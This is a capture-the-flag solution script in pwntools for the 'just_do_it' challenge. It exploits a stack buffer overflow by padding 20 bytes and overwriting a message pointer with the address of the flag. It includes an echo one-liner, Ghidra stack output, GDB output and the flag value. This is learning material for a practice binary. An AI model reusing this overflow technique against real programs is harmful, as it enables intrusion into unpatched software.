from pwn import *
import sys

p = process('./just_do_it', stdout=sys.stdout.fileno())

p.sendline(b'A'*0x14 + p32(0x0804a080))

p.wait_for_close()

# another way to solve:
# echo -ne "aaaaaaaaaaaaaaaaaaaa\x80\xa0\x04\x08" | ./just_do_it


"""

The idea here is: we want to overwrite failmsg(-0x14), using our input at input(-0x28).
So we need: 0x28 - 0x14 = 0x14 = 20 of padding
After that, we want to put the int32 '0x0804a080', this is the address of where the flag_content is stored. This can be seen with GDB.

Ghidra stack:
                         *******************************************************
                         *                      FUNCTION                       *
                         *******************************************************
                         int __cdecl main(void)
           int             EAX:4        <RETURN>                           XREF[2]:   08048655(W), 
                                                                                      080486dd(W)  
           undefined4      EAX:4        flag_content                       XREF[2]:   08048655(W), 
                                                                                      080486dd(W)  
           undefined4      EAX:4        cmp                                XREF[1]:   080486dd(W)  
           undefined4      Stack[0x0]:4 local_res0                         XREF[2]:   080485c2(R), 
                                                                                      08048708(*)  
           undefined4      Stack[-0xc]  local_c                            XREF[1]:   08048704(R)  
           undefined4      Stack[-0x14  failmsg                            XREF[2]:   0804860d(W), 
                                                                                      080486ee(W)  
           undefined4      Stack[-0x18  flag_file                          XREF[3]:   08048625(W), 
                                                                                      08048628(R), 
                                                                                      0804864b(R)  
           undefined1[1    Stack[-0x28  input                              XREF[2]:   080486a6(*), 
                                                                                      080486d9(*)  
                         main                                      XREF[4]:   Entry Point(*), 
                                                                               _start:080484d7(*), 0804886c, 
                                                                               080488c8(*)  
      080485bb 8d 4c 24      LEA       ECX=>Stack[0x4], [ESP + 0x4]

GDB, flag_content address:

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804a080  →  "TWCTF{pwnable_warmup_I_did_it!}\n"
$ebx   : 0x1
$ecx   : 0x0
$edx   : 0x0804b238  →  0x00000000
$esp   : 0xffffcc70  →  0x0804a080  →  "TWCTF{pwnable_warmup_I_did_it!}\n"
$ebp   : 0xffffcca8  →  0x08048710  →  <__libc_csu_init+0000> push ebp
$esi   : 0xffffcd84  →  0xffffcf8d  →  "/home/sekai/code/nightmare/workdir/ctf/02-stack_bu[...]"
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x0804865a  →  <main+009f> add esp, 0x10
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc70│+0x0000: 0x0804a080  →  "TWCTF{pwnable_warmup_I_did_it!}\n"   ← $esp
0xffffcc74│+0x0004: 0x00000030 ("0"?)
0xffffcc78│+0x0008: 0x0804b1a0  →  0xfbad2488
0xffffcc7c│+0x000c: 0x00000000
0xffffcc80│+0x0010: 0xf7ffcfec  →  0x00035f2c
0xffffcc84│+0x0014: 0x00000014
0xffffcc88│+0x0018: 0x00000000
0xffffcc8c│+0x001c: 0x00000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804864e <main+0093>      push   0x30
    0x8048650 <main+0095>      push   0x804a080
●   0x8048655 <main+009a>      call   0x8048440 <fgets@plt>
 →  0x804865a <main+009f>      add    esp, 0x10
    0x804865d <main+00a2>      test   eax, eax
    0x804865f <main+00a4>      jne    0x804867b <main+192>
    0x8048661 <main+00a6>      sub    esp, 0xc
    0x8048664 <main+00a9>      push   0x80487ee
    0x8048669 <main+00ae>      call   0x8048450 <perror@plt>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "just_do_it", stopped 0x804865a in main (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804865a → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/s *0x0804a080
0x54435754:     <error: Cannot access memory at address 0x54435754>
gef➤  x/s 0x0804a080
0x804a080 <flag>:       "TWCTF{pwnable_warmup_I_did_it!}\n"

"""
